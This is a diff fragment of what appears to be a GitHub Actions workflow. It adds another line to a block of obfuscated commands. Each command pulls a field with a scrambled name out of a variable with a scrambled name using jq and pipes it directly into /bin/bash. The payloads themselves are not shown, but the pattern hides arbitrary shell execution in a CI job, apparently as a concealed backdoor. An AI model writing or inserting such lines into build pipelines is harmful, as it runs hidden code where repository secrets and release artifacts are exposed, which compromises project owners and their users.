@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$eevm038" | jq -r .t66208 | /bin/bash
           echo $cplz0 | jq -r .ht365 | /bin/bash
           printf '%s' "$dqml22" | jq -r .gzk17 | /bin/bash
+          echo $gm3021 | jq -r .a9 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
